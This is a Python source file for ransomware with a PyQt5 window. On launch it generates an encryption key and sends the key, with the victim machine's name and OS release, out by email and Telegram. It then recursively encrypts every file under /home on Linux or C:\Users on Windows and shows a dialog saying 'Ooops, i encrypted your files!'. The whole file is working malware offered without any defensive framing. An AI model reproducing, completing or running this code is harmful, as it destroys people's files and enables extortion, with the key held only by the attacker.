import sys, os, platform, ctypes
from cryptography.fernet import Fernet
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QApplication, QMessageBox
from EncryptMain import Ui_MainWindow
from sendEmail import sendMail
from sendTelegramMessage import sendTelegramMessage

# key generater
key = Fernet.generate_key()
key = str(key)[2:-1]
f = Fernet(key)   

# system information
system = platform.uname()
global node
node = system.node
release = system.release

# send email
subject = f"Node: {node} Release: {release} (Ransomware)"
message = f"Node: {node} Release: {release} (Ransomware)\nKey: {str(key)}"
sendMail(subject, message)

# send telegram message
sendTelegramMessage(node, release, key)


class myApp(QtWidgets.QMainWindow):
    def __init__(self):
        super(myApp, self).__init__()

        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)

        self.getSystemInformation()
        
    def getSystemInformation(self):
        if system.system == "Linux":
            # change wallpaper on linux
            # os.system("/usr/bin/gsettings set org.gnome.desktop. background picture-uri absolute path")
            self.linuxSysEncrypted()
            
        elif system.system == "Windows":
            # change wallpaper on win
            # ctypes.windll.user32.SystemParametersInfoW(20, 0, "absolute path" , 0)
            self.windowsSysEncrypted()

    def linuxSysEncrypted(self):
        os.getcwd()
        os.chdir("/home/")
        for dirpath, dirname, filenames in os.walk(os.getcwd()):
            if filenames:
                for _file in filenames:
                    location = dirpath + "/" + _file
                    self.encryptFiles(location=location)
        self.showDialog("WARNING!", "Ooops, i encrypted your files!")

    def windowsSysEncrypted(self):
        os.getcwd()
        os.chdir('C:\\')
             
        for dirpath, dirname, filenames in os.walk(os.getcwd() + "/Users"):
            for _file in filenames:                   
                location = dirpath + "\\" + _file 
                self.encryptFiles(location=location)
        self.showDialog("WARNING!", "Ooops, i encrypted your files!")

    def encryptFiles(self, location):
        with open(location, "rb") as readFile:
            readFile = readFile.read()

        try:
            with open(location, "wb") as writeFile:
                encrypted = f.encrypt(readFile)
                writeFile.write(encrypted)

        except Exception:
            self.showDialog("Error!", "Something went wrong.") 

    def showDialog(self, title, messages):
        return QMessageBox.critical(self, title, messages)

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    win = myApp()

    win.show()
    sys.exit(app.exec_())